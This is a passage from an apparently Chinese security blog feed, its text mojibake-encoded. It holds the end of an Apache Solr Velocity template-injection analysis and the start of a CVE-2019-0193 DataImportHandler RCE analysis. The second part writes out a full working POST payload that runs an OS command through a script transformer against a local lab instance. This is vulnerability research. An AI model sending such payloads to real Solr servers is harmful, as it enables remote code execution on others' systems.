å‡½æ•°ï¼Œå…¶ä¼šå°†è¯·æ±‚ä¸­çš„<code>v.template</code>å¼€å¤´çš„å‚æ•°åæˆªå–å‰©ä¸‹çš„éƒ¨åˆ†+â€œ.vmâ€ä½œä¸ºkeyâ€”â€”æ³¨æ„åˆ°PoCä¸­çš„<code>v.template.custom=%23set($x=%27%27)...</code>ï¼Œæˆªå–åå¾—åˆ°<code>custom</code>+<code>.vm</code>=<code>custom.vm</code>ï¼Œè€Œè¯·æ±‚ä¸­å‚æ•°å†…å®¹ä½œä¸ºtemplateï¼Œå› æ­¤ç”±äºè¿™ä¸ªè€Œå‚æ•°æ—¶æ”»å‡»è€…å¯ä»¥æ§åˆ¶çš„â€”â€”ä¾‹å¦‚åœ¨PoCä¸­ï¼Œå°†å†…å®¹è®¾ç½®ä¸ºäº†<code>%23set($x=%27%27)...</code>ï¼Œå› æ­¤é€ æˆSSTIï¼š</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124211628918.png" alt="image-20191124211628918"></p><p>å†çœ‹ç¬¬äºŒä¸ªifâ€”â€”<code>SolrVelocityResourceLoader()</code>å…¶ä»»åŠ¡æ˜¯åŠ è½½ä¸€ä¸ªæœ‰velocity classpathçš„ResourceLoaderï¼š</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124212157913.png" alt="image-20191124212157913"></p><h3 id="VelocityResponseWriter-getTemplate"><a href="#VelocityResponseWriter-getTemplate" class="headerlink" title="VelocityResponseWriter#getTemplate"></a>VelocityResponseWriter#getTemplate</h3><p>å›åˆ°VelocityResponseWriter#writeï¼Œåœ¨VelocityResponseWriter#getTemplateæ—¶ï¼Œä¼šä»è¯·æ±‚v.templateå‚æ•°ä¸­è·å–æ¨¡æ¿çš„åç§°ï¼Œå³PoCä¸­çš„<code>v.template=custom</code>ï¼Œå†èµ°åˆ°<code>engine.getTemplate(templateName + TEMPLATE_EXTENSION)</code>è·å–templateï¼Œå³å‰é¢è®¾ç½®çš„<code>custom.vm</code>ï¼š</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191124205548129.png" alt="image-20191124205548129"></p><p>æ¨¡æ¿è§£é‡Šå‘ç”Ÿåœ¨<code>org.apache.velocity.Template#merge(Context, Writer)</code>ï¼Œåé¢å°±æ˜¯Velocityæ¨¡æ¿è§£é‡Šé€»è¾‘äº†ï¼Œä¸å†è·Ÿã€‚</p><p>æ€»ç»“ä¸€ä¸‹è°ƒç”¨æ ˆï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">doFilter:<span class="number">343</span>, SolrDispatchFilter (org.apache.solr.servlet)</span><br><span class="line">doFilter:<span class="number">397</span>, SolrDispatchFilter (org.apache.solr.servlet)</span><br><span class="line">call:<span class="number">558</span>, HttpSolrCall (org.apache.solr.servlet)</span><br><span class="line">writeResponse:<span class="number">849</span>, HttpSolrCall (org.apache.solr.servlet)</span><br><span class="line">  writeQueryResponse:<span class="number">65</span>, QueryResponseWriterUtil (org.apache.solr.response)</span><br><span class="line">    write:<span class="number">150</span>, VelocityResponseWriter (org.apache.solr.response)</span><br><span class="line">      createEngine:<span class="number">313</span>, VelocityResponseWriter (org.apache.solr.response)</span><br><span class="line">        SolrParamResourceLoader()<span class="comment">//è®¾ç½®params.resource.loaderâ€”â€”custom.vmæ¨¡æ¿</span></span><br><span class="line">      createEngine:<span class="number">324</span>, VelocityResponseWriter (org.apache.solr.response) <span class="comment">//è®¾ç½®solr.resource.loaderâ€”â€”åŠ è½½velocity lib</span></span><br><span class="line">    write:<span class="number">152</span>, VelocityResponseWriter (org.apache.solr.response)</span><br><span class="line">      getTemplate:<span class="number">372</span>, VelocityResponseWriter (org.apache.solr.response) <span class="comment">// è·å–æ¨¡æ¿</span></span><br><span class="line">    write:<span class="number">166</span>, VelocityResponseWriter (org.apache.solr.response)</span><br><span class="line">      merge:<span class="number">264</span>, Template (org.apache.velocity) <span class="comment">// æ¨¡æ¿æ¸²æŸ“ï¼ŒRCE</span></span><br><span class="line">        merge:<span class="number">359</span>, Template (org.apache.velocity)</span><br><span class="line">          render:<span class="number">376</span>, SimpleNode (org.apache.velocity.runtime.parser.node)</span><br></pre></td></tr></table></figure><h1 id="ä¿®å¤æ–¹å¼"><a href="#ä¿®å¤æ–¹å¼" class="headerlink" title="ä¿®å¤æ–¹å¼"></a>ä¿®å¤æ–¹å¼</h1><p>ä¸‹è½½v8.3.1çš„solrï¼Œå‘é€PoCåå¯ä»¥çœ‹åˆ°æŠ¥é”™äº†ï¼š</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191208165035876.png" alt="image-20191208165035876"></p><p>ä»æŠ¥é”™å†…å®¹ä¸Šçœ‹ï¼Œsolræ²¡è·å–åˆ°custom.vmæ¨¡æ¿ï¼Œé‚£å†å‚è€ƒä¹‹å‰åˆ†æï¼Œåº”è¯¥æ˜¯VelocityResponseWriter#createEngineåšäº†ä¿®æ”¹ï¼Œä½†æ˜¯è°ƒè¯•åå‘ç°è¿™é‡Œå¹¶æ²¡ä¿®æ”¹ï¼Œåªæ˜¯ä¸¤ä¸ªifåˆ¤æ–­éƒ½ä¸ºfalseäº†ï¼ŒparamsResourceLoaderEnabledå’ŒsolrResourceLoaderEnabledéƒ½æ˜¯falseï¼š</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191208172313550.png" alt="image-20191208172313550"></p><p>ç»è¿‡è°ƒè¯•ï¼Œå¯ä»¥æ‰¾åˆ°VelocityResponseWriterçš„æ„é€ è°ƒç”¨æ ˆï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">init:<span class="number">110</span>, VelocityResponseWriter (org.apache.solr.response)</span><br><span class="line">initInstance:<span class="number">104</span>, PluginBag (org.apache.solr.core)</span><br><span class="line">createInst:<span class="number">443</span>, PluginBag$LazyPluginHolder (org.apache.solr.core)</span><br><span class="line">get:<span class="number">415</span>, PluginBag$LazyPluginHolder (org.apache.solr.core)</span><br><span class="line">get:<span class="number">168</span>, PluginBag (org.apache.solr.core)</span><br><span class="line">get:<span class="number">178</span>, PluginBag (org.apache.solr.core)</span><br><span class="line">getQueryResponseWriter:<span class="number">2753</span>, SolrCore (org.apache.solr.core)</span><br><span class="line">getResponseWriter:<span class="number">788</span>, HttpSolrCall (org.apache.solr.servlet)</span><br><span class="line">call:<span class="number">556</span>, HttpSolrCall (org.apache.solr.servlet)</span><br><span class="line">doFilter:<span class="number">397</span>, SolrDispatchFilter (org.apache.solr.servlet)</span><br><span class="line">doFilter:<span class="number">343</span>, SolrDispatchFilter (org.apache.solr.servlet)</span><br></pre></td></tr></table></figure><p>åœ¨init()ä¸­å¯ä»¥çœ‹åˆ°enabledçš„å€¼å–å†³äº<code>PARAMS_RESOURCE_LOADER_ENABLED</code>å’Œ<code>SOLR_RESOURCE_LOADER_ENABLED</code>ï¼Œæ³¨æ„è¿™é‡Œçš„è·å–æ–¹å¼ï¼š</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191208200421304.png" alt="image-20191208200421304"></p><p>å¯¹æ¯”ä¸‹é¢çš„v8.3.1ç‰ˆæœ¬ï¼š</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191208194710665.png" alt="image-20191208194710665"></p><p><code>Boolean.getBoolean()</code>æ˜¯ä»ç³»ç»Ÿå˜é‡é‡Œé¢æ‹¿å‚æ•°ï¼Œæ‰€ä»¥PoCçš„ç¬¬ä¸€ä¸ªåŒ…ï¼ˆ0x01æ­¥ï¼‰çš„è®¾ç½®æ²¡æœ‰ç”¨ã€‚å³å®˜æ–¹ä¿®å¤æ–¹æ¡ˆé€‰æ‹©åœ¨PoCçš„ç¬¬ä¸€æ­¥ä¿®å¤ï¼Œå³åŠ è½½é…ç½®ä¸ä»solrä¸­åŠ è½½è€Œæ˜¯ä»ç³»ç»Ÿé…ç½®ä¸­åŠ è½½ï¼Œä»¥æ­¤å¯¼è‡´ç¬¬äºŒæ­¥ä¸­çš„æ¨¡æ¿ä¸å¯æ§ï¼ŒPoCå¤±æ•ˆã€‚</p><h1 id="æ£€æµ‹æ–¹å¼"><a href="#æ£€æµ‹æ–¹å¼" class="headerlink" title="æ£€æµ‹æ–¹å¼"></a>æ£€æµ‹æ–¹å¼</h1><p>å› ä¸ºæ¶‰åŠçš„å˜é‡å’Œæ¡ä»¶å¤ªå¤šäº†ï¼Œæ„Ÿè§‰ç™½ç›’å³ä½¿ç”¨æ±¡ç‚¹ä¼ æ’­ä¹Ÿå¾ˆéš¾å‘ç°bugï¼Œå¦å¤–ï¼Œå¦‚æœè¦ç”¨æ±¡ç‚¹ä¼ æ’­ï¼Œæœ€å¥½èƒ½åŠ ä¸Šåå‘ä¼ æ’­ï¼Œè¿™æ ·æ‰èƒ½è¯†åˆ«å®˜æ–¹çš„ä¿®å¤æ–¹æ¡ˆã€‚</p><p>é»‘ç›’æ£€æµ‹çš„è¯å°±çœ‹åŒ…å‘çš„é‚£å‡ ä¸ªå˜é‡å°±å¯ä»¥äº†ã€‚</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>åˆè¡¥ä¸Šäº†ä¸€ä¸ªå²å‰çš„å‘ï¼Œè¿™æ¬¡solrçš„æ¼æ´å‡ºå‘è¿‡ç¨‹æ¯”è¾ƒå¤æ‚ï¼Œå¯¼è‡´ç™½ç›’å¾ˆéš¾æ£€æµ‹ï¼Œæ—¥åå¯ä»¥æ€è€ƒå¦‚ä½•è§£å†³è¿™ä¸€ç±»æ¼æ´ã€‚</p><h1 id="ç›¸å…³é“¾æ¥"><a href="#ç›¸å…³é“¾æ¥" class="headerlink" title="ç›¸å…³é“¾æ¥"></a>ç›¸å…³é“¾æ¥</h1><ul><li>æ¼æ´åˆ†æ - Apache Solr æ¨¡ç‰ˆæ³¨å…¥æ¼æ´(RCE) ï¼Œ<a href="https://xz.aliyun.com/t/6700" target="_blank" rel="noopener">https://xz.aliyun.com/t/6700</a> </li><li>è¯¦ç»†åˆ†æSolrçš„CVE-2019-0193ä»¥åŠvelocityæ¨¡æ¿æ³¨å…¥æ–°æ´ï¼Œ <a href="https://mp.weixin.qq.com/s/gl35WFkxhAbuw7BNQa1FiQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/gl35WFkxhAbuw7BNQa1FiQ</a></li><li>Raw Pocï¼Œ<a href="https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt" target="_blank" rel="noopener">https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt</a> </li></ul>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´åˆ†æ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¼æ´åˆ†æ </tag>
            
            <tag> Solr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Solr DataImportHandler RCE(CVE-2019-0193)æ¼æ´åˆ†æ</title>
      <link href="/vulnresearch-Solr_DataImportHandler_RCE/"/>
      <url>/vulnresearch-Solr_DataImportHandler_RCE/</url>
      
        <content type="html"><![CDATA[<h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p>å…ˆåˆ°solrä¸Šä¸‹è½½jarå’Œsrcï¼Œè¿™é‡Œé€‰æ‹©çš„ç‰ˆæœ¬ä¸ºv8.1.0</p><p><a href="https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0.zip" target="_blank" rel="noopener">https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0.zip</a></p><p><a href="https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0-src.tgz" target="_blank" rel="noopener">https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0-src.tgz</a></p><a id="more"></a><p>è¿è¡Œè¿œç¨‹è°ƒè¯•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">anemone<span class="meta">@ANEMONE</span>-ASUS:/mnt/d/Store/document/all_my_work/solr/solr-<span class="number">8.1</span><span class="number">.0</span></span><br><span class="line">$ cd server/ #ä¸€å®šè¦åœ¨serverä¸‹è¿è¡Œ</span><br><span class="line">anemone<span class="meta">@ANEMONE</span>-ASUS:/mnt/d/Store/document/all_my_work/solr/solr-<span class="number">8.1</span><span class="number">.0</span>/server</span><br><span class="line">$ java <span class="string">"-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=9000"</span> -Dsolr.solr.home=<span class="string">"../example/example-DIH/solr/"</span> -jar start.jar --<span class="keyword">module</span>=http</span><br></pre></td></tr></table></figure><p>è®¿é—® <a href="http://localhost:8983/solr/" target="_blank" rel="noopener">http://localhost:8983/solr/</a> å‡ºç°æ§åˆ¶å°è¯´æ˜æœåŠ¡å¯åŠ¨æˆåŠŸ</p><h1 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h1><p>å‘é€payload(æ³¨æ„tikaæ˜¯demoä¸­å­˜åœ¨çš„coreï¼Œéœ€è¦é’ˆå¯¹å…¶ä»–ç«™ç‚¹åšå˜åŠ¨)</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/solr/tika/dataimport</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1:8983</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br><span class="line"><span class="attribute">Content-Length</span>: 363</span><br><span class="line"></span><br><span class="line">command=full-import&amp;dataConfig=</span><br><span class="line">&lt;dataConfig&gt;</span><br><span class="line">  &lt;dataSource type="URLDataSource"/&gt;</span><br><span class="line">  &lt;script&gt;&lt;![CDATA[</span><br><span class="line">  function func(x)&#123;</span><br><span class="line">  java.lang.Runtime.getRuntime().exec("calc");</span><br><span class="line">  &#125; </span><br><span class="line">  ]]&gt;&lt;/script&gt;</span><br><span class="line">  &lt;document&gt;</span><br><span class="line">    &lt;entity name="stackoverflow" url="https://stackoverflow.com/feeds/tag/solr" processor="XPathEntityProcessor" forEach="/feed" transformer="script:func" /&gt;</span><br><span class="line">  &lt;/document&gt;</span><br><span class="line">&lt;/dataConfig&gt;</span><br></pre></td></tr></table></figure><p>èƒ½å¼¹è®¡ç®—å™¨è¯´æ˜payloadç”Ÿæ•ˆã€‚</p><h1 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h1><h2 id="èƒŒæ™¯çŸ¥è¯†"><a href="#èƒŒæ™¯çŸ¥è¯†" class="headerlink" title="èƒŒæ™¯çŸ¥è¯†"></a>èƒŒæ™¯çŸ¥è¯†</h2><h3 id="dataimport"><a href="#dataimport" class="headerlink" title="dataimport"></a>dataimport</h3><p>å…ˆäº†è§£ä¸‹<code>/solr/{core}/dataimport</code>ï¼Œè¯¥APIçš„ä½œç”¨æ˜¯å°†æ•°æ®å…¨é‡/å¢é‡å¯¼å…¥åˆ°solrä¸­ï¼Œæ›´è¯¦ç»†è§£é‡Šåœ¨ï¼š</p><ul><li><a href="https://cwiki.apache.org/confluence/display/solr/DataImportHandler#DataImportHandler-ScriptTransformer" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/solr/DataImportHandler#DataImportHandler-ScriptTransformer</a> </li><li><a href="https://lucene.apache.org/solr/guide/6_6/uploading-structured-data-store-data-with-the-data-import-handler.html" target="_blank" rel="noopener">https://lucene.apache.org/solr/guide/6_6/uploading-structured-data-store-data-with-the-data-import-handler.html</a> </li></ul><p>å…¶ä¸­çœ‹åˆ°payloadä¸­éœ€è¦çš„å­—æ®µæœ‰ï¼š</p><ul><li>dataSourceï¼šæ•°æ®æºï¼Œæœ‰ä»¥ä¸‹å‡ ç§ç±»å‹ï¼Œæ¯ç§ç±»å‹æœ‰è‡ªå·±ä¸åŒçš„å±æ€§<ul><li>JdbcDataSourceï¼šæ•°æ®åº“æº</li><li>URLDataSourceï¼šé€šå¸¸ä¸XPathEntityProcessoré…åˆä½¿ç”¨ï¼Œå¯ä»¥ä½¿ç”¨file://ã€http://ã€                          ftp://ç­‰åè®®è·å–æ–‡æœ¬æ•°æ®æº</li><li>HttpDataSourceï¼šä¸URLDataSourceä¸€æ ·ï¼Œåªæ˜¯åå­—ä¸åŒ</li><li>FileDataSourceï¼šä»ç£ç›˜æ–‡ä»¶è·å–æ•°æ®æº</li><li>FieldReaderDataSourceï¼šå¦‚æœå­—æ®µåŒ…å«xmlä¿¡æ¯æ—¶ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸ªé…åˆXPathEntityProcessor                                ä½¿ç”¨</li><li>ContentStreamDataSourceï¼šä½¿ç”¨postæ•°æ®ä½œä¸ºæ•°æ®æºï¼Œå¯ä¸ä»»ä½•EntityProcessoré…åˆä½¿ç”¨</li></ul></li><li>Entityï¼šå®ä½“ï¼Œç›¸å½“äºå°†æ•°æ®æºçš„æ“ä½œçš„æ•°æ®å°è£…æˆä¸€ä¸ªJavaå¯¹è±¡ï¼Œå­—æ®µå°±å¯¹åº”å¯¹è±¡å±æ€§ï¼Œå¯¹äºxml/httpæ•°æ®æºçš„å®ä½“å¯ä»¥åœ¨é»˜è®¤å±æ€§ä¹‹ä¸Šå…·æœ‰ä»¥ä¸‹å±æ€§ï¼š<ul><li>urlï¼ˆå¿…é¡»ï¼‰ï¼šç”¨äºè°ƒç”¨REST APIçš„URLã€‚ï¼ˆå¯ä»¥æ¨¡æ¿åŒ–ï¼‰ã€‚å¦‚æœæ•°æ®æºæ˜¯æ–‡ä»¶ï¼Œåˆ™å®ƒå¿…é¡»æ˜¯æ–‡ä»¶ä½ç½®</li><li>processorï¼ˆå¿…é¡»ï¼‰ï¼šå€¼å¿…é¡»æ˜¯ â€œXPathEntityProcessorâ€</li><li>forEachï¼ˆå¿…é¡»ï¼‰ï¼šåˆ’åˆ†è®°å½•çš„xpathè¡¨è¾¾å¼ã€‚å¦‚æœæœ‰å¤šç§ç±»å‹çš„è®°å½•ç”¨â€œ|â€ï¼ˆç®¡é“ï¼‰åˆ†éš”å®ƒä»¬ã€‚å¦‚æœ                         useSolrAddSchemaè®¾ç½®ä¸ºâ€™trueâ€™ï¼Œåˆ™å¯ä»¥çœç•¥</li><li>stream ï¼ˆå¯é€‰ï¼‰ï¼šå¦‚æœxmléå¸¸å¤§ï¼Œåˆ™å°†æ­¤å€¼è®¾ç½®ä¸ºtrue</li></ul></li></ul><h3 id="ScriptTransformer"><a href="#ScriptTransformer" class="headerlink" title="ScriptTransformer"></a>ScriptTransformer</h3><p>ä»datasourceå˜ä¸ºentityå­˜åœ¨è½¬æ¢(Transform)ï¼Œè€Œdataconfigä¸­å¯ä»¥ä½¿ç”¨javascriptå†™è½¬åŒ–é€»è¾‘ï¼Œä¾‹å¦‚å®˜ç½‘ä¸­ç»™çš„ä¾‹å­</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dataConfig</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span>&lt;![CDATA[</span><br><span class="line"><span class="javascript">                <span class="function"><span class="keyword">function</span> <span class="title">f1</span>(<span class="params">row</span>)        </span>&#123;</span></span><br><span class="line"><span class="javascript">                    row.put(<span class="string">'message'</span>, <span class="string">'Hello World!'</span>);</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">return</span> row;</span></span><br><span class="line">                &#125;</span><br><span class="line">        ]]&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">document</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">entity</span> <span class="attr">name</span>=<span class="string">"e"</span> <span class="attr">pk</span>=<span class="string">"id"</span> <span class="attr">transformer</span>=<span class="string">"script:f1"</span> <span class="attr">query</span>=<span class="string">"select * from X"</span>&gt;</span></span><br><span class="line">                ....</span><br><span class="line">                <span class="tag">&lt;/<span class="name">entity</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">document</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dataConfig</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™ä¹Ÿæ˜¯é€ æˆæœ¬æ¬¡rceçš„sinkç‚¹äº†ã€‚</p><h3 id="Nashorn-è§£æ"><a href="#Nashorn-è§£æ" class="headerlink" title="Nashorn è§£æ"></a>Nashorn è§£æ</h3><p>åœ¨<code>&lt;script&gt;</code>æ ‡ç­¾ä¸­ï¼Œå®šä¹‰äº†jsè„šæœ¬ï¼Œå…¶èƒŒåæ˜¯é€šè¿‡Nashornåšè§£æçš„ï¼Œå…·ä½“æ¥è¯´ï¼Œå…¶å¯ä»¥ä½¿ç”¨jsè¯­æ³•ï¼Œå¼•ç”¨javaä¸­çš„å¯¹è±¡ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> MyJavaClass = Java.type(<span class="string">`my.package.MyJavaClass`</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> result = MyJavaClass.sayHello(<span class="string">'Nashorn'</span>);</span><br><span class="line">print(result);</span><br></pre></td></tr></table></figure><h2 id="é™æ€åˆ†æå…¥å£ç‚¹"><a href="#é™æ€åˆ†æå…¥å£ç‚¹" class="headerlink" title="é™æ€åˆ†æå…¥å£ç‚¹"></a>é™æ€åˆ†æå…¥å£ç‚¹</h2><p>å…ˆæ‹–ä¸‹å¯¹åº”ç‰ˆæœ¬çš„æºä»£ç ï¼ˆ<a href="https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0-src.tgzï¼‰" target="_blank" rel="noopener">https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0-src.tgzï¼‰</a></p><p>æ‰¾<code>/solr/{core}/dataimport</code>çš„å…¥å£ï¼Œåœ¨<code>server/solr-webapp/webapp/WEB-INF/web.xml</code>çœ‹filterï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Any path (name) registered in solrconfig.xml will be sent to that filter --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>SolrRequestFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.apache.solr.servlet.SolrDispatchFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">  Exclude patterns is a list of directories that would be short circuited by the </span></span><br><span class="line"><span class="comment">  SolrDispatchFilter. It includes all Admin UI related static content.</span></span><br><span class="line"><span class="comment">  <span class="doctag">NOTE:</span> It is NOT a pattern but only matches the start of the HTTP ServletPath.</span></span><br><span class="line"><span class="comment">  --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>excludePatterns<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>/partials/.+,/libs/.+,/css/.+,/js/.+,/img/.+,/templates/.+<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>SolrRequestFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ‰€æœ‰çš„urlé€šè¿‡<code>org.apache.solr.servlet.SolrDispatchFilter</code>å¤„ç†ï¼Œåœ¨è¿™ä¸ªç±»é‡Œé¢è°ƒè¯•<code>doFilter()</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest _request, ServletResponse _response, FilterChain chain, <span class="keyword">boolean</span> retry)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!(_request <span class="keyword">instanceof</span> HttpServletRequest)) <span class="keyword">return</span>;</span><br><span class="line">  HttpServletRequest request = closeShield((HttpServletRequest)_request, retry);</span><br><span class="line">  HttpServletResponse response = closeShield((HttpServletResponse)_response, retry);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (cores == <span class="keyword">null</span> || cores.isShutDown()) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">    <span class="comment">// No need to even create the HttpSolrCall object if this path is excluded.</span></span><br><span class="line">    <span class="keyword">if</span> (excludePatterns != <span class="keyword">null</span>) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">    AtomicReference&lt;HttpServletRequest&gt; wrappedRequest = <span class="keyword">new</span> AtomicReference&lt;&gt;();</span><br><span class="line">    <span class="comment">// the response and status code have already been sent</span></span><br><span class="line">    <span class="keyword">if</span> (!authenticateRequest(request, response, wrappedRequest)) &#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">    <span class="keyword">if</span> (wrappedRequest.get() != <span class="keyword">null</span>) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line"> <span class="comment">// Authentication</span></span><br><span class="line">    <span class="keyword">if</span> (cores.getAuthenticationPlugin() != <span class="keyword">null</span>) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line"> <span class="comment">// Entry</span></span><br><span class="line">    HttpSolrCall call = getHttpSolrCall(request, response, retry);</span><br><span class="line">    ExecutorUtil.setServerThreadFlag(Boolean.TRUE);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      Action result = call.call();</span><br><span class="line">      <span class="keyword">switch</span> (result) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…³é”®ä»£ç åœ¨17-20è¡Œï¼Œé¦–å…ˆæ 